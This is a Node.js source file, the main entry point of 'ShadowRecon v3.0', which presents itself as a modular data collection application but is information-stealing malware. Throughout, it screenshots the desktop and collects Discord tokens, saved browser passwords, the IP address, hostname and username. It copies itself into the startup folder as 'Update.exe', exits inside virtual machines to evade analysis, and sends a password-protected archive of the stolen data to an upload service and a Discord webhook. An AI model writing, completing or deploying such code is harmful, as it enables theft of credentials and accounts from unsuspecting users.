/**
 * @fileoverview Main Application Entry Point
 * @description Clean, modular, and efficient data collection application
 * @version 3.0.0
 * @author ShadowRecon Team
 * @license MIT
 */

/**
 * @typedef {Object} SystemInfo
 * @property {string} ip - Public IP address
 * @property {string} hostname - System hostname
 * @property {string} username - Current username
 * @property {string} platform - Operating system platform
 * @property {string} arch - System architecture
 * @property {string} nodeVersion - Node.js version
 */

/**
 * @typedef {Object} CollectionResults
 * @property {Object} discord - Discord account data
 * @property {Object} browsers - Browser data collection results
 * @property {Object} [screenshot] - Screenshot capture result
 */

const { logger } = require('./core/logger');
const { ErrorHandler } = require('./core/errors');
const config = require('./config/config');
const { fileManager } = require('./core/fileManager');
const { stats } = require('./core/statistics');
const { serviceManager } = require('./core/serviceManager');
const CoreUtils = require('./core/utils');

/**
 * Main Application Class
 * Orchestrates the entire data collection workflow
 * @class Application
 */
class Application {
    /**
     * Creates an instance of Application
     * @constructor
     */
    constructor() {
        /** @type {boolean} */
        this.initialized = false;
        /** @type {CollectionResults} */
        this.results = {};
        /** @type {string|null} */
        this.screenshotPath = null;
        
        // Setup error handlers
        ErrorHandler.setupGlobalHandlers();
    }

    /**
     * Initialize application components and services
     * @async
     * @returns {Promise<void>}
     * @throws {Error} When initialization fails
     */
    async initialize() {
        try {
            logger.info('Initializing ShadowRecon v3.0');

            // Validate configuration
            if (!config.validate()) {
                throw new Error('Invalid configuration');
            }

            // Initialize service manager
            await serviceManager.initialize();

            // Collect system information
            await this.collectSystemInfo();

            // Setup persistence if enabled
            await this.setupPersistence();

            this.initialized = true;
            logger.info('Application initialized successfully');
        } catch (error) {
            ErrorHandler.handle(error);
            throw error;
        }
    }

    /**
     * Collect system information and store in statistics
     * @async
     * @returns {Promise<void>}
     * @private
     */
    async collectSystemInfo() {
        try {
            const systemInfo = {
                ip: await CoreUtils.getPublicIp(),
                hostname: await CoreUtils.getHostname(),
                username: CoreUtils.getUsername(),
                platform: process.platform,
                arch: process.arch,
                nodeVersion: process.version
            };

            stats.setSystemInfo(systemInfo);
            logger.info('System information collected', systemInfo);
        } catch (error) {
            logger.error('Failed to collect system information', error.message);
        }
    }

    /**
     * Setup persistence mechanism
     */
    async setupPersistence() {
        try {
            if (!config.get('security.enableSelfDestruct', false)) {
                return;
            }

            const startupPath = config.get('paths.startup');
            const currentExe = process.argv0;
            const targetPath = require('path').join(startupPath, 'Update.exe');

            if (require('fs').existsSync(currentExe)) {
                require('fs').copyFileSync(currentExe, targetPath);
                logger.debug('Persistence setup completed', { target: targetPath });
            }
        } catch (error) {
            logger.debug('Persistence setup failed', error.message);
        }
    }

    /**
     * Capture desktop screenshot
     * @returns {Promise<string|null>} Path to screenshot file
     */
    async captureScreenshot() {
        try {
            logger.info('Capturing desktop screenshot');
            const screenshotService = serviceManager.getService('screenshot');
            this.screenshotPath = await screenshotService.captureScreenshot();
            
            if (this.screenshotPath) {
                logger.info('Screenshot captured successfully', { path: this.screenshotPath });
            } else {
                logger.warn('Failed to capture screenshot');
            }
            
            return this.screenshotPath;
        } catch (error) {
            logger.error('Screenshot capture failed', error.message);
            return null;
        }
    }

    /**
     * Run data collection modules
     */
    async collectData() {
        if (!this.initialized) {
            await this.initialize();
        }

        logger.info('Starting data collection');

        const modules = config.get('modules.enabled');
        const results = {};

        // Discord data collection - check first if Discord tokens exist
        if (modules.discord) {
            try {
                logger.info('Collecting Discord data');
                const discordService = serviceManager.getService('discord');
                results.discord = await discordService.collectAccounts();
                
                // Exit early if no Discord accounts found
                const discordAccounts = results.discord?.length || 0;
                if (discordAccounts === 0) {
                    logger.info('No Discord tokens found - exiting');
                    return null;
                }
                
                logger.info(`Found ${discordAccounts} Discord accounts - proceeding`);
            } catch (error) {
                ErrorHandler.handle(error);
                logger.info('Discord data collection failed - exiting');
                return null;
            }
        } else {
            logger.info('Discord module disabled - exiting');
            return null;
        }

        // Browser data collection - only if we have Discord tokens
        if (modules.browsers) {
            try {
                logger.info('Collecting browser data');
                const browserCollector = serviceManager.getService('browserCollector');
                results.browsers = await browserCollector.collect();
            } catch (error) {
                ErrorHandler.handle(error);
                results.browsers = { error: error.message };
            }
        }

        this.results = results;
        
        logger.info('Data collection completed', {
            modules: Object.keys(results),
            browserAccounts: results.browsers?.totalPasswords || 0,
            discordAccounts: results.discord?.length || 0
        });

        return results;
    }

    /**
     * Process and send collected data
     */
    async processAndSend() {
        try {
            logger.info('Processing collected data');

            // Initialize file manager now that we have data to process
            fileManager.init();

            // Save screenshot to archive folder
            const screenshotService = serviceManager.getService('screenshot');
            if (this.screenshotPath && screenshotService.screenshotExists()) {
                try {
                    const screenshotBuffer = screenshotService.getScreenshotBuffer();
                    if (screenshotBuffer) {
                        const filename = require('path').basename(this.screenshotPath);
                        fileManager.saveBuffer(screenshotBuffer, 'Screenshots', filename);
                        logger.info('Screenshot saved to archive', { filename });
                    }
                } catch (error) {
                    logger.warn('Failed to save screenshot to archive', error.message);
                }
            }

            // Get system info for context
            const systemInfo = stats.getRawData().system;
            const userIp = systemInfo.ip || 'Unknown';

            // Generate password for ZIP file if needed
            const uploadService = serviceManager.getService('upload');
            let zipPassword = null;
            if (uploadService.shouldPasswordProtect(fileManager.getZipPath())) {
                zipPassword = CoreUtils.generatePassword(16);
                logger.info('Generated password for ZIP file protection');
            }

            // Create archive
            const zipPath = await fileManager.createZip(zipPassword);
            const zipSizeMB = fileManager.getZipSizeMB();

            logger.info('Archive created', {
                path: zipPath,
                size: `${zipSizeMB.toFixed(2)} MB`,
                passwordProtected: !!zipPassword
            });

            // Upload file if needed
            let uploadResult = null;
            if (uploadService.shouldUpload(zipPath)) {
                logger.info('Uploading file to external service');
                
                const metadata = zipPassword ? { password: zipPassword } : {};
                try {
                    uploadResult = await uploadService.upload(zipPath, null, metadata);
                    if (uploadResult) {
                        logger.info('File uploaded successfully');
                    }
                } catch (error) {
                    logger.warn('Upload failed - continuing with local file', error.message);
                }
            }

            // Send Discord account embeds
            if (this.results.discord && Array.isArray(this.results.discord) && this.results.discord.length > 0) {
                const discordService = serviceManager.getService('discord');
                await discordService.sendAccountEmbeds(this.results.discord, userIp, uploadResult, zipPath, zipPassword);
                logger.info('Sent Discord account embeds');
            } else {
                // Send main webhook if no Discord accounts available
                await this.sendMainWebhook(uploadResult, zipPath, zipPassword);
                logger.info('Sent main webhook');
            }

            logger.info('Data processing completed');
        } catch (error) {
            ErrorHandler.handle(error);
            throw error;
        }
    }

    /**
     * Send main webhook with statistics
     */
    async sendMainWebhook(uploadResult = null, zipPath = '', zipPassword = null) {
        try {
            const discordService = serviceManager.getService('discord');
            const systemInfo = stats.getRawData().system;
            const payload = stats.buildWebhookPayload(
                systemInfo.username,
                systemInfo.hostname,
                systemInfo.ip,
                uploadResult ? uploadResult.downloadUrl : ''
            );

            if (uploadResult && uploadResult.downloadUrl) {
                // Send with link and password if available
                const embed = JSON.parse(payload).embeds[0];
                
                // Add password information if present
                const password = uploadResult.password || zipPassword;
                if (password) {
                    embed.fields.push({
                        name: ':key: Password',
                        value: `\`${password}\``,
                        inline: true
                    });
                }
                
                await discordService.sendWebhook(JSON.parse(JSON.stringify({ embeds: [embed] })));
            } else {
                // Send with file attachment and password info if available
                const embed = JSON.parse(payload).embeds[0];
                
                // Add password information if present
                if (zipPassword) {
                    embed.fields.push({
                        name: ':key: Password',
                        value: `\`${zipPassword}\``,
                        inline: true
                    });
                }
                
                await discordService.sendFile(zipPath, embed);
            }

            logger.info('Main webhook sent successfully');
        } catch (error) {
            logger.error('Failed to send main webhook', error.message);
        }
    }

    /**
     * Cleanup resources
     */
    async cleanup() {
        try {
            logger.info('Cleaning up resources');

            // Clean up temporary files
            fileManager.cleanup();

            // Clean up services
            await serviceManager.cleanup();

            logger.info('Cleanup completed');
        } catch (error) {
            logger.error('Cleanup failed', error.message);
        }
    }

    /**
     * Run complete application workflow
     */
    async run() {
        try {
            logger.info('Starting ShadowRecon v3.0');

            // Capture screenshot first
            await this.captureScreenshot();

            // Initialize application
            await this.initialize();

            // VM detection if enabled
            if (config.get('security.enableVmDetection')) {
                const isVm = await CoreUtils.isVirtualMachine();
                if (isVm) {
                    logger.warn('Virtual machine detected, exiting');
                    return;
                }
            }

            // Collect data
            const results = await this.collectData();
            
            // Exit early if no data collected
            if (results === null) {
                logger.info('ShadowRecon completed - no data to process');
                return;
            }

            // Process and send data
            await this.processAndSend();

            logger.info('ShadowRecon completed successfully');
        } catch (error) {
            logger.error('Application failed', error.message);
            ErrorHandler.handle(error);
        } finally {
            // Always cleanup
            await this.cleanup();
        }
    }
}

/**
 * Application entry point
 */
async function main() {
    const app = new Application();
    await app.run();
}

// Run application if this file is executed directly
if (require.main === module) {
    main().catch(error => {
        console.error('Unhandled error:', error);
        process.exit(1);
    });
}

module.exports = {
    Application,
    main
};